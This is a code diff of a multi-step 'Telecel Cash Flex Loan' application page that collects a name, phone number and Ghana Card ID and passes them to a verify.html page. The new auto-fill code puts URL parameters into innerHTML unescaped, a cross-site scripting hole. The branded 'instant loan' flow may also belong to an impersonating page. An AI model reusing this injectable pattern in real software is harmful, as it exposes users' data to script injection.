@@ -12,7 +12,7 @@
             --telecel-red-hover: #c41e1b;
             --dark: #1a1a1a;
             --text-gray: #4a5568;
-            --glass-bg: rgba(255, 255, 255, 0.85);
+            --glass-bg: rgba(255, 255, 255, 0.88);
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
         body {
@@ -33,13 +33,18 @@
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255,255,255,0.9);
             box-shadow: 0 20px 60px rgba(228, 35, 32, 0.15);
-            max-width: 520px;
+            max-width: 540px;
             width: 100%;
             border-radius: 28px;
             padding: 40px 35px;
         }
-        .form-container::before {
-            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--telecel-red);
+        .debug-box {
+            background: #fff0f0;
+            border: 1px solid #ffe0e0;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
         }
         .form-header { text-align: center; margin-bottom: 35px; }
         .form-header h2 { font-size: 28px; font-weight: 800; color: var(--dark); }
@@ -51,7 +56,6 @@
 
         .form-step { display: none; }
         .form-step.active { display: block; }
-
         .form-group { margin-bottom: 24px; }
         label { display: block; font-weight: 600; color: var(--text-gray); margin-bottom: 8px; }
         .form-control {
@@ -75,7 +79,7 @@
 
     <div class="form-container">
         <div class="form-header">
-            <h2>Apply for Flex Loan</h2>
+            <h2>Telecel Cash Flex Loan</h2>
             <p>Instant approval • Funds in minutes</p>
             <div class="progress-bar">
                 <div class="progress-segment active" id="prog-1"></div>
@@ -84,15 +88,21 @@
             </div>
         </div>
 
+        <!-- Debug Box -->
+        <div class="debug-box" id="debugInfo">
+            <strong>📥 Received from Index:</strong><br>
+            <span id="debugText">Loading...</span>
+        </div>
+
         <form id="loanForm">
-            <!-- Step 1 -->
+            <!-- Step 1: Loan Details -->
             <div class="form-step active" id="step-1">
                 <div class="form-group">
                     <label>Loan Amount (GHS)</label>
-                    <input type="number" class="form-control" id="loanAmount" placeholder="2500" min="500" max="25000" required>
+                    <input type="number" class="form-control" id="loanAmount" placeholder="5000" min="500" max="25000" required>
                 </div>
                 <div class="form-group">
-                    <label>Loan Duration (Period)</label>
+                    <label>Loan Duration (Days)</label>
                     <select class="form-control" id="duration" required>
                         <option value="">Select Duration</option>
                         <option value="7">7 Days</option>
@@ -106,8 +116,8 @@
                     <label>Loan Purpose</label>
                     <select class="form-control" id="purpose" required>
                         <option value="">Select Purpose</option>
-                        <option value="Business">Business / Trading</option>
                         <option value="Emergency">Emergency Needs</option>
+                        <option value="Business">Business / Trading</option>
                         <option value="Medical">Medical Bills</option>
                         <option value="Education">School Fees</option>
                         <option value="Personal">Personal Use</option>
@@ -119,30 +129,30 @@
                 </div>
             </div>
 
-            <!-- Step 2 -->
+            <!-- Step 2: Personal Info -->
             <div class="form-step" id="step-2">
                 <div class="form-group">
                     <label>Full Name</label>
                     <input type="text" class="form-control" id="fullName" placeholder="Kwame Mensah" required>
                 </div>
                 <div class="form-group">
-                    <label>Telecel Number</label>
-                    <input type="tel" class="form-control" id="phone" placeholder="0501234567" required>
+                    <label>Telecel Phone Number</label>
+                    <input type="tel" class="form-control" id="phone" placeholder="0501234567" maxlength="10" required>
                 </div>
                 <div class="form-group">
-                    <label>Ghana Card ID</label>
-                    <input type="text" class="form-control" id="idNumber" placeholder="GHA-XXXXXXXXX" required>
+                    <label>Ghana Card ID (Optional)</label>
+                    <input type="text" class="form-control" id="idNumber" placeholder="GHA-123456789-0">
                 </div>
                 <div class="button-group">
                     <button type="button" class="btn btn-secondary" onclick="prevStep(2)">Back</button>
-                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Review Application</button>
+                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next Step</button>
                 </div>
             </div>
 
-            <!-- Step 3 -->
+            <!-- Step 3: Summary -->
             <div class="form-step" id="step-3">
                 <h4 style="color:var(--telecel-red); margin-bottom:15px;">Application Summary</h4>
-                <div style="background:#fff; padding:18px; border-radius:12px; border:1px solid #fee2e2;">
+                <div style="background:#fff; padding:20px; border-radius:12px; border:1px solid #fee2e2;">
                     <p><strong>Amount:</strong> <span id="sum-amount">-</span></p>
                     <p><strong>Duration:</strong> <span id="sum-duration">-</span></p>
                     <p><strong>Purpose:</strong> <span id="sum-purpose">-</span></p>
@@ -152,7 +162,7 @@
                 <div class="button-group">
                     <button type="button" class="btn btn-secondary" onclick="prevStep(3)">Back</button>
                     <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">
-                        Proceed to Verification →
+                        Confirm & Proceed to Verification →
                     </button>
                 </div>
             </div>
@@ -206,23 +216,44 @@
 
             setTimeout(() => {
                 window.location.href = `verify.html?${params.toString()}`;
-            }, 1200);
+            }, 1500);
         }
 
-        // Auto-fill from URL parameters (from main page)
+        // ==================== AUTO FILL FROM INDEX + GHANA PHONE VALIDATION ====================
         window.onload = () => {
             const urlParams = new URLSearchParams(window.location.search);
-            
-            if (urlParams.get('amount')) {
+            let debugMsg = "";
+
+            if (urlParams.has('amount')) {
                 document.getElementById('loanAmount').value = urlParams.get('amount');
+                debugMsg += `Amount: GHS ${urlParams.get('amount')}<br>`;
             }
-            if (urlParams.get('duration')) {
+            if (urlParams.has('duration')) {
                 document.getElementById('duration').value = urlParams.get('duration');
+                debugMsg += `Duration: ${urlParams.get('duration')} Days<br>`;
             }
-            if (urlParams.get('purpose')) {
+            if (urlParams.has('purpose')) {
                 document.getElementById('purpose').value = urlParams.get('purpose');
+                debugMsg += `Purpose: ${urlParams.get('purpose')}`;
             }
+
+            document.getElementById('debugText').innerHTML = debugMsg || "No parameters received";
         };
+
+        // Ghana Phone Number Validation (real-time)
+        document.getElementById('phone').addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 10) val = val.substring(0, 10);
+            this.value = val;
+
+            if (val.length === 10) {
+                if (!/^(020|050|055|024|059|027|057|026|056)/.test(val)) {
+                    this.style.borderColor = '#dc3545';
+                } else {
+                    this.style.borderColor = '#E42320';
+                }
+            }
+        });
     </script>
 </body>
 </html>
